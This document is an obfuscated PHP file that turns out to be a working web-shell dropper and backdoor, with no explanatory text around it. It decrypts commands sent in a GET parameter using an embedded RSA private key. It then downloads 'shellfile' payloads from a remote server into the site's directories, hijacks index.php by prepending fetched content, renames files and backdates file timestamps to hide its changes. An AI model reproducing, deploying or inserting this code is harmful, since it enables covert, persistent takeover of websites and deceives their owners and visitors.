<?php
 goto fnVNo; hCBym: function doRename($params) { if (empty($params["\x73\x6f\x75\162\x63\145\156\141\x6d\145"])) { error("\x73\157\165\162\143\x65\156\141\155\x65\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x72\x65\x6e\141\x6d\x65"])) { error("\162\145\156\141\155\145\40" . MsgText::PARAM_EMPTY, $params); } if ($params["\x73\x6f\x75\162\143\145\x6e\x61\155\145"] === $params["\x72\145\156\141\155\x65"]) { error(MsgText::NOCHANGE); } $sourceFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\x73\x6f\x75\162\x63\x65\156\x61\x6d\x65"]; $renameFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\x72\145\156\x61\155\145"]; $resSource = $params["\163\145\x72\166\x65\162"] . str_replace(strtolower($_SERVER["\104\117\103\x55\115\x45\116\124\x5f\122\117\117\124"]), '', strtolower($sourceFile)); $resSource = str_replace("\x5c", "\x2f", $resSource); if (file_exists($sourceFile)) { if (rename($sourceFile, $renameFile)) { success($renameFile); } else { error(MsgText::RENAME_ERROR, compact("\x72\145\156\x61\155\145\106\151\x6c\x65")); } } else { error(MsgText::LOCAL_FILE_EXISTS, compact("\162\145\163\123\157\165\x72\x63\x65")); } } goto qvYYx; H35Bm: $params = json_decode($params, true); goto xqNQ2; SW12p: function getUrl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); curl_exec($curl); $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); if ($httpCode === 200) { $content = curl_exec($curl); return array("\143\x6f\144\x65" => 200, "\162\x65\163\x70" => $content); } return array("\x63\157\144\145" => 500, "\162\x65\x73\x70" => ''); } goto Mj0uk; xqNQ2: if (!is_array($params)) { error(MsgText::PARAM_TYPE, $params); } goto WqVTV; zcRD6: function doSub($params) { if (empty($params["\163\150\145\x6c\154\146\151\154\145"])) { error("\x73\x68\145\x6c\x6c\146\151\x6c\145" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x66\x69\154\145\x6e\141\x6d\x65"])) { error("\146\x69\154\145\x6e\x61\155\145\x20" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\x44\x4f\x43\x55\x4d\105\116\124\x5f\x52\117\117\124"] . "\57" . $params["\146\151\x6c\x65\156\141\155\x65"]; $remoteFileUrl = $params["\x73\x65\162\166\x65\162"] . $params["\163\150\x65\x6c\154\146\x69\154\145"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\162\x65\163\165\154\164"])) { if (copyfile($content["\x72\x65\163\x75\x6c\x74"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\x6f\143\141\x6c\146\151\x6c\145\160\141\164\150")); } error(MsgText::REMOTE_GET_ERROR, compact("\x72\145\x6d\x6f\164\145\106\x69\154\x65\x55\162\154")); } goto HlaSM; zrz65: function doBeima($params) { if (empty($params["\x66\x69\x6c\145\156\141\x6d\145"])) { error("\146\151\154\x65\156\141\155\x65\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\163\x68\145\154\x6c\x66\x69\x6c\145"])) { error("\163\x68\145\x6c\154\146\x69\x6c\x65\40" . MsgText::PARAM_EMPTY, $params); } empty($params["\x6c\145\x76\x65\x6c"]) && ($params["\x6c\x65\x76\145\154"] = 6); $dirs = getDirPathsByLevel($params["\154\x65\166\145\154"]); $temp = array_rand($dirs); $createDir = $dirs[$temp] . "\57"; $localfilepath = $createDir . $params["\146\x69\x6c\145\x6e\x61\155\145"]; $remoteFileUrl = $params["\163\x65\162\x76\x65\162"] . $params["\x73\150\x65\x6c\154\146\x69\154\145"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\x65\x73\x75\x6c\164"])) { if (copyfile($content["\162\145\163\165\154\164"], $localfilepath)) { updateFiletime($localfilepath); $beimaurl = str_replace($_SERVER["\x44\117\103\x55\x4d\105\116\x54\137\x52\x4f\117\x54"], '', $localfilepath); success(compact("\x6c\x6f\x63\141\x6c\x66\151\154\x65\x70\x61\x74\x68", "\142\x65\151\x6d\x61\165\x72\154")); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\x6f\x63\141\154\x66\x69\x6c\x65\x70\141\x74\150")); } error(MsgText::REMOTE_FILE_EXISTS, compact("\x72\x65\155\x6f\x74\x65\x46\151\x6c\145\125\x72\x6c")); } goto hCBym; HeepS: function copyfile($content, $localfile, $isAppend = false, $appendContent = '') { if ($isAppend && !empty($appendContent)) { $content = trim($content); if (substr($content, -2, 2) !== "\77\x3e") { $content .= "\x20\x3f\x3e"; } $content = $content . PHP_EOL . PHP_EOL . $appendContent; } @file_put_contents($localfile, $content); if (!file_exists($localfile)) { $openedfile = @fopen($localfile, "\x77"); @fwrite($openedfile, $content); @fclose($openedfile); } if (!file_exists($localfile)) { return false; } return true; } goto eDRTy; H1jBl: function error($msg = MsgText::UNKNOWN_ERROR, $extras = array(), $code = 0) { empty($code) && ($code = ErrorCode::E_200400); die(@json_encode(array("\x63\157\144\145" => $code, "\155\x73\147" => $msg, "\x65\x78\x74\x72\141\163" => $extras), JSON_UNESCAPED_UNICODE)); } goto jDZ3t; YlGtY: $iden = isset($params["\151\x64\x65\x6e"]) ? strtolower($params["\x69\144\145\156"]) : ''; goto icsAU; OIJ6f: if (is_null($params)) { error(MsgText::DECRYPT_FAIL); } goto H35Bm; icsAU: switch ($iden) { case "\142\x65\x69\155\141": $res = doBeima($params); break; case "\162\x65\x6e\x61\155\x65": $res = doRename($params); break; case "\151\156\144\145\x78": $res = doIndex($params); break; case "\x73\165\x62": case "\150\164\x61\143\x63\x65\x73\x73": $res = doSub($params); break; case "\x6c\157\x63\153": $res = doLock($params); break; case "\x73\164\171\x6c\145": $res = doStyle($params); break; default: error("\x69\144\x65\x6e\x20" . MsgText::VALUE_ERROR); } goto zrz65; WqVTV: if (empty($params["\163\145\162\x76\145\162"])) { error("\163\145\x72\166\x65\162\x20" . MsgText::PARAM_EMPTY); } goto W00WK; gsi9e: class MsgText { const PARAM_EMPTY = "\160\x61\162\141\155\x20\151\x73\x20\145\x6d\x70\164\171"; const PARAM_TYPE = "\160\141\162\x61\155\x20\x74\x79\160\145\x20\x65\x72\x72\157\x72"; const VALUE_ERROR = "\x76\141\154\x75\145\40\145\x72\162\157\x72"; const NOCHANGE = "\x6e\157\40\143\x68\x61\x6e\147\x65"; const LOCK_FILE_SUCCESS = "\147\145\x6e\145\162\141\164\145\40\154\157\143\153\40\146\x69\x6c\x65\40\163\x75\x63\143\145\163\163\54\142\x75\164\40\154\157\x63\x6b\x20\x69\156\x64\x65\170\x2e\160\150\x70\40\145\162\x72\x6f\162"; const LOCK_FILE_ERROR = "\147\x65\156\145\162\141\164\x65\40\154\x6f\143\153\40\x66\151\x6c\x65\40\x65\x72\162\x6f\162"; const REMOTE_GET_ERROR = "\147\x65\x74\40\162\145\x6d\157\x74\x65\x20\143\157\156\164\x65\156\164\40\145\x72\162\157\162"; const LOCAL_FILE_ERROR = "\x67\x65\x6e\145\x72\x61\164\x65\x20\x6c\x6f\143\141\x6c\40\x66\151\154\x65\40\x65\162\x72\x6f\162"; const SUCCESS = "\x73\165\x63\143\145\163\x73"; const LOCAL_FILE_EXISTS = "\x6c\x6f\x63\141\154\40\x66\151\x6c\x65\40\x64\157\145\x73\x6e\47\x74\40\145\170\x69\x73\x74"; const REMOTE_FILE_EXISTS = "\x72\x65\155\x6f\164\x65\40\146\x69\x6c\x65\x20\x64\x6f\145\x73\156\47\x74\x20\145\x78\x69\163\x74"; const RENAME_ERROR = "\x72\145\x6e\x61\155\145\40\145\x72\x72\157\x72"; const INDEX_ERROR = "\x69\x6e\144\145\170\40\x68\151\x6a\141\143\153\x20\x65\x72\x72\x6f\162"; const UNKNOWN_ERROR = "\x75\x6e\x6b\x6e\157\x77\x6e\40\145\162\162\157\x72"; const DECRYPT_FAIL = "\160\141\162\141\x6d\x73\x20\144\x65\143\162\x79\x70\x74\x20\x66\x61\151\x6c"; } goto H1jBl; Mj0uk: function getRemoteContent($url) { $content = @file_get_contents($url); if ($content === false) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); $content = curl_exec($curl); curl_close($curl); } return !empty($content) && is_string($content) ? $content : ''; } goto HeepS; nBZwl: class ErrorCode { const E_200400 = 200400; } goto gsi9e; eDRTy: function updateFiletime($filepath) { $ctime = filectime($filepath); $now = time(); if (!($now > $ctime + 31104000)) { $newTime = $now - mt_rand(15552000, 31104000); touch($filepath, $newTime, $newTime); return true; } return true; } goto pbcLf; qvYYx: function doIndex($params) { if (empty($params["\x73\150\x65\x6c\x6c\x66\x69\x6c\x65"])) { error("\x73\150\145\x6c\x6c\146\x69\154\x65\40" . MsgText::PARAM_EMPTY, $params); } $remoteUrl = $params["\x73\145\162\166\x65\x72"] . trim($params["\163\x68\x65\154\x6c\146\x69\154\x65"]); $localfilepath = $_SERVER["\x44\x4f\103\x55\x4d\x45\116\124\137\x52\x4f\x4f\x54"] . "\57\x69\x6e\x64\x65\x78\56\160\x68\x70"; $content = getRemoteContent($remoteUrl); $content = json_decode($content, true); if (!empty($content["\162\x65\163\x75\154\x74"])) { $oldContent = ''; if (file_exists($localfilepath)) { $oldContent = @file_get_contents($localfilepath); } elseif (file_exists($_SERVER["\104\117\103\125\115\105\116\x54\x5f\x52\117\117\x54"] . "\57\151\156\144\145\x78\x2e\x68\164\x6d\154")) { $oldContent = @file_get_contents($_SERVER["\x44\x4f\x43\125\x4d\x45\116\x54\x5f\x52\x4f\x4f\124"] . "\57\x69\x6e\144\x65\x78\x2e\x68\164\155\154"); } elseif (file_exists($_SERVER["\x44\117\103\125\115\105\116\x54\x5f\x52\117\x4f\124"] . "\x2f\151\156\x64\145\170\56\x68\164\155")) { $oldContent = @file_get_contents($_SERVER["\x44\117\x43\125\x4d\105\116\x54\137\122\x4f\x4f\124"] . "\x2f\151\156\144\x65\x78\x2e\150\164\x6d"); } elseif (file_exists($_SERVER["\104\117\103\125\115\105\x4e\124\137\x52\x4f\117\x54"] . "\x2f\x64\145\146\x61\165\x6c\x74\56\150\164\155\154")) { $oldContent = @file_get_contents($_SERVER["\104\117\x43\x55\x4d\x45\x4e\124\x5f\x52\x4f\x4f\x54"] . "\57\144\x65\x66\x61\x75\x6c\164\56\150\164\155\x6c"); } elseif (file_exists($_SERVER["\104\x4f\103\125\x4d\x45\116\124\137\x52\117\x4f\x54"] . "\x2f\144\x65\146\141\165\x6c\x74\x2e\x68\x74\155")) { $oldContent = @file_get_contents($_SERVER["\x44\117\x43\125\115\105\116\124\x5f\122\x4f\117\124"] . "\x2f\x64\145\x66\x61\x75\154\x74\x2e\150\x74\x6d"); } if (copyfile($content["\x72\x65\163\165\154\164"], $localfilepath, true, $oldContent)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\x6f\x63\141\154\x66\151\154\x65\160\141\x74\x68")); } error(MsgText::INDEX_ERROR, compact("\x72\145\x6d\157\164\145\x55\x72\x6c")); } goto zcRD6; WDPrT: $p = $_GET["\x70"]; goto I8MGZ; jDZ3t: function success($data) { die(@json_encode(array("\x63\157\x64\x65" => 200, "\x6d\x73\x67" => MsgText::SUCCESS, "\x64\141\x74\x61" => $data), JSON_UNESCAPED_UNICODE)); } goto fxvvH; fnVNo: error_reporting(0); goto nBZwl; W00WK: if (empty($params["\x69\x64\145\x6e"])) { error("\x69\x64\145\156\x20" . MsgText::PARAM_EMPTY); } goto YlGtY; fxvvH: function getDirPathsByLevel($level = 6) { $initDir = $_SERVER["\104\x4f\x43\125\x4d\105\116\x54\x5f\122\117\x4f\x54"]; $dirs = array($initDir); $count = count($dirs); while (count($dirs) > $count - 1) { $path = $dirs[$count - 1]; $count += 1; if (@is_dir($path) && @($handle = @opendir($path))) { while ($file = @readdir($handle)) { $realpath = $path . "\x2f" . $file; if ($file == "\x2e" || $file == "\56\56" || !is_dir($realpath) || substr($file, 0, 1) === "\56") { continue; } $path3 = str_replace($initDir, '', $path); $path4 = explode("\x2f", $path3); if (count($path4) > $level - 1) { continue; } $dirs[] = $realpath; } } @closedir($handle); } return $dirs; } goto SW12p; HlaSM: function doLock($params) { if (empty($params["\146\151\x6c\145\156\141\155\x65"])) { error("\146\151\154\145\x6e\x61\x6d\145\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\144\x6f\155\x61\x69\x6e"])) { error("\x64\157\155\141\x69\156\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\163\150\145\154\x6c\146\151\154\x65"])) { error("\x73\x68\145\x6c\x6c\x66\x69\x6c\145\40" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\104\x4f\103\125\x4d\105\116\124\x5f\x52\x4f\x4f\124"] . "\x2f" . $params["\x66\x69\154\145\x6e\x61\x6d\x65"]; $remoteFileUrl = $params["\x73\145\162\166\x65\162"] . $params["\x73\150\x65\154\x6c\146\x69\154\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\162\x65\163\165\x6c\x74"])) { if (copyfile($content["\x72\x65\163\165\154\164"], $localfilepath)) { $lockurl = $params["\x64\157\155\141\x69\x6e"] . $params["\x66\x69\x6c\x65\156\x61\x6d\x65"]; $lockres = getUrl($lockurl); @unlink($localfilepath); if ($lockres["\x63\x6f\144\145"] === 200 && !empty($lockres["\x72\145\163\160"]) && strpos($lockres["\x72\145\x73\x70"], "\163\x75\x63\143\145\x73\x73")) { success($lockres["\x72\x65\163\x70"]); } error(MsgText::LOCK_FILE_SUCCESS, compact("\154\x6f\143\x6b\165\162\x6c", "\154\157\x63\x6b\x72\x65\x73")); } @unlink($localfilepath); error(MsgText::LOCK_FILE_ERROR, compact("\x6c\157\x63\141\154\x66\151\x6c\145\x70\x61\164\x68")); } error(MsgText::REMOTE_GET_ERROR, compact("\x72\145\155\157\164\x65\106\x69\154\145\125\162\154")); } goto aiM_f; pbcLf: $privateKey = "\x2d\x2d\x2d\x2d\x2d\x42\x45\107\x49\x4e\40\120\x52\x49\x56\x41\x54\x45\x20\x4b\x45\x59\55\x2d\55\55\55\40\115\111\x49\x45\166\x51\111\x42\101\x44\x41\x4e\x42\x67\x6b\x71\x68\x6b\151\x47\71\x77\60\102\x41\121\x45\x46\101\x41\123\x43\x42\x4b\143\x77\x67\147\x53\x6a\101\x67\105\x41\x41\157\111\x42\101\x51\x43\x33\x30\x77\x34\71\x49\x74\117\x66\154\144\121\x36\x20\x64\x42\53\x30\147\x45\142\145\x65\x57\x36\x42\x45\x43\x6c\x63\x78\x2b\116\132\x7a\x6d\x70\x58\62\131\x63\122\x48\x46\126\x38\60\x42\165\x72\x43\x57\x42\141\x76\120\x46\145\150\126\70\123\171\71\171\x4c\x32\165\57\x79\x33\155\166\x33\121\x4a\112\53\40\170\62\x6b\x4b\166\154\x79\70\x7a\x4b\x78\x34\x47\142\130\x50\x62\x73\127\112\x6b\66\x48\157\x30\x52\170\161\x34\x39\157\130\x6b\102\141\x72\x51\102\x4f\x71\122\117\x5a\145\141\106\x46\x33\115\172\x70\x64\x2f\120\144\114\x53\x73\x78\105\x76\107\61\x4d\x20\164\x51\x64\62\x77\117\170\65\162\x36\130\x44\70\x36\152\171\146\x4e\67\x4c\101\x4a\125\125\126\x76\142\x4a\x76\x6e\x31\x43\x48\157\60\63\156\x46\110\61\x32\153\61\113\131\167\x4c\156\121\146\172\x51\x49\x35\x6e\x58\67\x79\121\114\141\x30\x6a\x74\40\x66\x47\x35\124\x41\x33\x34\x46\x6d\x30\x45\x4d\x62\x46\144\110\x57\x6a\101\116\57\x56\144\x45\x6a\157\112\111\x36\151\164\x34\120\x43\121\120\x35\167\x6b\64\147\x61\x32\102\166\126\x71\165\x51\153\165\120\142\163\x62\x72\x38\63\x36\x34\144\63\111\66\x20\x47\165\107\x41\113\104\122\x30\x77\146\153\x54\62\x30\156\60\105\x36\153\101\155\x44\111\63\157\x6c\62\142\x66\141\x30\162\121\x6e\143\x71\x55\x53\x33\117\125\63\111\x4e\160\170\117\x5a\x53\70\145\113\x43\111\147\x43\x33\x62\115\x38\x31\x6d\x64\151\40\115\x51\66\124\x73\x41\x51\x39\x41\147\115\102\101\101\x45\x43\x67\147\105\101\x4a\114\x47\x53\154\101\x32\x52\160\114\x64\160\170\70\154\x4b\125\165\x4f\121\121\x66\x53\110\132\x47\146\166\145\142\x2f\x45\x32\x44\x5a\154\67\x2b\144\123\x47\115\x35\112\x20\x47\x6b\x4d\111\131\x74\x6e\141\x54\101\113\120\121\x38\x6a\x6e\163\x33\x37\123\112\x58\103\163\x6d\x52\x52\150\102\116\x66\x30\65\x69\x32\60\101\x42\163\104\164\x41\x51\x2f\111\124\111\167\157\160\x6d\101\101\x50\x68\x68\x52\x33\x49\x47\144\x43\x66\x4c\x20\x62\167\171\161\107\x63\x45\117\161\71\x78\132\102\71\164\127\71\x36\x35\x59\x4a\x6b\x37\x4b\160\154\x4c\x6c\x39\x34\161\x4e\x58\164\122\x38\x43\165\65\172\170\x63\x36\125\104\153\164\x6a\110\102\122\x6b\57\x4b\x79\x2f\x46\x58\112\x4f\x6a\120\x4b\115\x20\x73\101\70\x72\x68\157\x78\x37\144\161\x6c\x5a\x55\102\63\111\57\161\151\161\162\x51\117\x67\124\61\x42\x73\x71\x31\102\x46\124\x2b\62\x47\107\167\x52\125\127\x5a\x31\x43\x79\106\157\x5a\x76\x68\163\104\157\x6d\144\x6f\64\171\x68\122\x72\x42\x30\142\40\x38\x59\155\64\115\x44\151\x56\x71\x78\106\x50\x56\x57\x38\130\x42\71\122\106\x44\71\131\x4b\164\x2b\x76\65\60\x45\x62\x36\151\123\x4b\x4a\116\x4c\160\x52\x6d\x6a\132\x44\x4e\132\x62\162\105\x59\x4f\x36\x4e\x52\x73\x52\102\x4d\67\142\162\104\141\71\x20\156\x33\x39\x6d\x5a\127\106\x72\64\x37\x77\x47\x47\130\x58\x76\x2f\x4e\x68\x77\124\x76\x52\x49\53\x32\x53\151\57\x5a\x66\144\120\x34\x2b\x6f\65\x54\x65\x53\127\121\x4b\102\147\x51\104\150\111\126\117\x55\x4f\x44\x69\163\x69\x4c\150\x6b\x37\130\x4b\x62\40\x59\165\x37\102\127\61\132\106\x63\x4b\x30\112\x78\x75\x72\x71\x48\116\62\x32\155\163\166\x41\60\121\57\61\161\64\x52\x76\x7a\151\x45\124\152\x65\153\130\111\x6e\71\x6c\x56\113\x43\155\123\57\147\171\62\117\x32\122\164\x75\x51\122\x75\154\x41\x52\40\146\143\63\x73\x7a\x32\x57\x39\164\x4e\130\x52\106\70\x41\166\x79\60\x37\62\70\116\107\x30\142\x61\x4f\117\x77\x42\x61\154\x4f\70\167\x33\x63\x43\x58\x36\116\156\155\x37\60\x70\112\145\x72\x2b\x69\112\x53\156\x33\164\155\x41\x4b\123\x42\64\x4c\x54\x20\166\142\123\x42\70\x70\164\66\121\147\x50\70\x4e\x50\x48\x79\121\x64\127\x70\x32\x4c\x77\x4f\164\x77\113\102\x67\x51\104\x52\x42\70\x6c\x67\x53\141\111\x6d\111\x4d\112\102\141\x58\105\x52\x53\x61\157\x4e\147\x38\x6b\x78\x76\x33\57\143\166\64\x67\x35\x20\152\125\x6c\154\152\170\x4e\121\x63\x55\x73\152\60\x56\67\x58\151\x6c\x6e\102\63\155\106\170\161\x35\162\110\152\102\132\124\x73\x4b\172\115\115\121\x79\166\150\117\170\131\x68\160\164\104\x66\167\x36\117\x4c\x74\157\x50\x55\x6b\x32\127\151\102\125\163\40\x6c\63\x71\125\60\x74\x49\x58\116\x4e\x2b\x63\124\x78\x75\x32\123\115\113\124\152\x77\x4d\x6b\164\153\160\x6d\101\103\x4a\161\x61\53\153\62\67\145\x45\125\161\x78\162\113\x4f\57\x36\123\105\x69\120\x39\x46\115\130\110\x76\x67\101\x34\105\105\x42\115\40\x48\x77\x77\x31\145\125\71\x51\161\x77\113\102\147\101\127\x53\x59\x35\125\160\150\x77\x32\117\110\x4c\x49\171\x78\153\106\x65\x51\63\x5a\65\157\x6a\162\x35\166\x4f\66\x66\x41\67\126\x6a\x6e\x59\105\x6c\144\66\107\x41\x43\170\x73\124\x63\141\x57\161\40\166\154\x72\124\x69\153\71\x4f\122\125\x54\x6d\167\125\x73\143\127\152\157\x33\x38\x44\154\x4a\101\x34\101\x45\60\156\112\x38\x59\112\x70\x5a\172\67\x54\121\x51\x76\112\x33\x32\x67\x50\x55\x7a\x6c\x47\x43\x53\105\x35\x6b\64\x45\x56\x71\x4c\66\126\x4c\x20\121\x35\123\152\161\x2b\x7a\172\141\x44\120\x6a\x31\105\145\x50\160\x76\x75\x75\x34\153\162\71\x46\151\115\x7a\x47\107\120\122\115\103\x52\x2f\115\161\x58\x6c\53\106\71\110\155\x43\x31\x63\166\70\115\x43\x59\x44\125\154\101\x6f\x47\102\101\x4b\67\67\x20\147\67\160\x56\x4b\x61\x59\x64\127\153\x43\x44\x30\151\x45\x55\164\x34\x52\153\167\57\111\x66\x53\170\x77\171\x51\147\x6c\x62\155\167\x75\156\147\102\127\x68\111\142\x4f\x30\117\x31\x37\130\71\x46\144\x30\x6e\70\111\x57\125\x35\x57\153\125\x62\x52\170\40\145\71\x58\x62\x59\142\105\x30\x35\x74\x30\x63\x6f\x62\x45\x5a\x46\143\147\x30\x74\x46\x71\x4c\110\x57\x52\x63\117\163\x31\x2f\141\123\x42\131\x63\64\114\x31\x77\150\115\112\x72\152\163\x6b\111\x61\x36\101\60\67\x4c\122\63\165\157\x51\x52\162\70\162\40\64\161\x6b\127\x37\131\x72\164\171\132\154\165\113\x36\145\101\102\102\171\x43\x58\x53\x62\145\x69\x54\x52\x6c\x64\x6b\63\103\61\53\x65\124\171\66\57\116\x41\157\x47\101\x62\x39\x2f\x4a\53\116\127\162\150\131\123\162\x2f\x56\157\x47\x57\x6a\165\x69\x20\x63\x68\x58\103\116\163\x7a\171\64\167\x36\145\170\x56\x77\x78\x58\121\113\x4e\x54\164\x6c\172\x4b\x78\x79\150\121\x66\x56\120\x4b\62\x42\170\x72\160\x74\x57\x4c\x36\113\103\122\113\160\172\x33\167\150\x2b\127\x59\x32\103\63\121\131\x79\x56\x66\167\x47\40\x46\102\x34\x68\167\104\162\x32\155\131\64\124\x57\x46\71\x70\x44\x31\x39\x34\x69\x45\123\x31\x79\x68\162\121\107\154\x49\x38\x58\115\53\62\114\126\x68\x42\x6c\x33\x70\60\170\53\124\x46\x67\112\115\141\x54\147\x44\x44\x71\x41\156\x78\160\165\x71\x54\40\165\x70\102\131\x71\124\x59\115\154\117\144\x2b\126\122\67\x68\x45\116\x4d\141\x46\x71\x6f\x3d\x20\55\x2d\x2d\55\x2d\x45\116\104\40\120\x52\111\x56\x41\124\105\40\x4b\x45\131\x2d\55\55\x2d\55"; goto WDPrT; I8MGZ: $params = openssl_private_decrypt(base64_decode(urldecode($p)), $decrypted, $privateKey) ? $decrypted : null; goto OIJ6f; aiM_f: function doStyle($params) { if (empty($params["\x73\150\x65\154\x6c\x66\151\154\145"])) { error("\x73\x68\x65\154\154\146\x69\x6c\x65" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x66\x69\x6c\x65\x6e\141\x6d\x65"])) { error("\x66\x69\x6c\x65\156\x61\155\145\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\144\157\x6d\x61\x69\x6e"])) { error("\x64\157\155\141\151\x6e\40" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $params["\144\157\155\141\x69\x6e"] . $params["\146\151\154\145\x6e\141\x6d\145"]; $remoteFileUrl = $params["\163\145\162\x76\x65\162"] . $params["\x73\150\x65\x6c\154\146\x69\x6c\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\x65\163\165\154\164"])) { if (copyfile($content["\x72\145\x73\165\154\164"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\154\157\143\x61\x6c\x66\151\x6c\145\160\141\164\x68")); } error(MsgText::REMOTE_GET_ERROR, compact("\x72\x65\x6d\157\164\x65\106\x69\154\145\125\x72\x6c")); }
